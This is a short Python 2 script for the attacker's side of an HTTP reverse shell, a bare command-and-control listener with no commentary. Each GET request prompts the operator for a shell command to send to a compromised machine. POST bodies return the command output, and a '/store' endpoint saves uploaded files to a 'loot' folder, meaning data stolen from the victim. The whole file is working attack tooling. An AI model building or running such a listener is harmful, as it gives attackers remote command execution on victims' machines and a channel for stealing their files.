import BaseHTTPServer
import os,cgi

HOST_NAME = '127.0.0.1'
PORT_NUMBER = 80

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(s):
        command = raw_input("Shell> ")
        s.send_response(200)
        s.send_header("Content-type",'text/html')
        s.end_headers()
        s.wfile.write(command)
    def do_POST(s):
        if s.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(s.headers.getheader('Content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp = s.rfile, headers=s.headers,environ={'REQUEST_METHOD':'POST'})
                else:
                    print "[-] Unexpected POST request"
                fs_up = fs['file']
                with open('/home/user/loot/1.txt', 'wb') as o:
                    o.write(fs_up.file.read())
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print e
            return
        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-Length'])
        postVar = s.rfile.read(length)
        print postVar

if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print '[!] Server is terminated'
        httpd.server_close()
